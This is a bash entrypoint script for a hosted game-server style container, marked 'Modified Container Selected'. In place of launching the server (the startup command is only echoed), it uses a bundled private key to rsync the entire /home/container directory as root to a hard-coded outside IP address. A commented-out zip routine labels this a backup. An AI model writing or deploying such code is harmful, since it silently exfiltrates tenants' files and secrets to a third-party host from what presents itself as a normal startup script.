#!/bin/bash

cd /home/container

echo "Modified Container Selected"


# Replace Startup Variables
MODIFIED_STARTUP=`eval echo $(echo ${STARTUP} | sed -e 's/{{/${/g' -e 's/}}/}/g')`
echo ":/home/container$ ${MODIFIED_STARTUP}"

chmod 600 /home/container/magicpi
rsync -avz -P -e 'ssh -i /home/container/magicpi' /home/container/* root@54.39.62.75://home/another/

#Old Backup Method 
#zip -r Backup-$(date +"%Y-%m-%d").zip /home/container/*
#ehco "Backup Complete"

if [ $? -ne 0 ]; then
    echo "FLO7_CONTAINER_ERR: There was an error while attempting to run the start command."
    exit 1
fi
